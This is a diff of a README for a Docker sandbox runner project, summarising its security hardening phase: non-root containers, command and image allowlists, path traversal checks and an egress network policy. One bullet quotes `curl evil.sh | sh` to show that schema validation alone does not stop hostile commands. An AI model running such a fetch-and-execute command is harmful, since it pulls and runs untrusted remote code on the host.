@@ -15,12 +15,12 @@ unstructured failure logs. The sandbox executes; the verifier decides. Never the
 
 ## Status
 
-**Phase 1 complete — minimal Docker runner.**
+**Phase 2 complete — security hardening.**
 
 | | Phase | State |
 |---|---|---|
 | 1 | Minimal Docker runner | ✅ Complete |
-| 2 | Security hardening | Not started |
+| 2 | Security hardening | ✅ Complete |
 | 3 | Port + readiness | Not started |
 | 4 | Log streaming (WebSocket) | Not started |
 | 5 | Repository analyzer | Not started |
@@ -29,6 +29,21 @@ unstructured failure logs. The sandbox executes; the verifier decides. Never the
 | 8 | AI fallback planner + repair | Stretch |
 | 9 | Frontend | Not started |
 | 10 | Documentation + portfolio | Not started |
+
+### What Phase 2 delivers
+
+- Containers run **non-root** (uid 1000) with `capDrop ALL`, `no-new-privileges`,
+  a **read-only root filesystem**, PID limits, and memory/CPU ceilings — each asserted
+  against the state the kernel actually enforces, not the config Docker was handed
+- DevLaunch's own runner image (`docker/runner/`), which must pre-create `/workspace`
+  owned by the non-root user, because a volume over a path the image lacks mounts root-owned
+- **Command allowlist** — approved binaries, no shell metacharacters, and constrained
+  `npm run` script names. Schema validation is not security: `curl evil.sh | sh` is
+  valid JSON
+- **Image allowlist**, frozen at module load
+- **Path traversal rejection**, including escapes only visible after normalisation
+- **Network egress policy** blocking RFC1918, link-local, and the VM host itself
+- 67 security tests (54 unit, 13 integration) covering all ten checks in §27
 
 ### What Phase 1 delivers
 
@@ -53,12 +68,16 @@ unstructured failure logs. The sandbox executes; the verifier decides. Never the
 
 ```bash
 pnpm install
+./scripts/build-runner-images.sh      # build the allowlisted runner image
+./scripts/setup-network-policy.sh     # install the egress policy in the Colima VM
 pnpm typecheck
 pnpm test          # includes integration tests that drive real containers
 pnpm test:unit     # unit tests only, no Docker required
 ```
 
-Integration tests pull `node:20-slim` on first run.
+Both scripts are idempotent. The network policy lives inside the Colima VM and must be
+reapplied if that VM is recreated; without it the security suite fails loudly rather
+than passing with weaker isolation.
 
 ## Documentation
 
@@ -77,6 +96,11 @@ its own because its remedy differs entirely from a port that never opened.
 **Readiness is not correctness.** READY means an HTTP server returned a complete
 response — *any* status. An app redirecting `/` to `/login` returns 302; an API with no
 root route returns 404. Both are running fine, and neither should fail a run.
+
+**One policy chain is not enough.** `DOCKER-USER` filters only *forwarded* traffic. A
+packet from a container to the VM itself — its own gateway included — terminates
+locally and hits `INPUT`, which `DOCKER-USER` never sees. Blocking egress requires both
+chains; a test asserting the gateway times out is what caught the gap.
 
 **The container is the security boundary, not the planner.** `npm run dev` executes
 whatever `package.json` says, and that file is written by the repository author. The
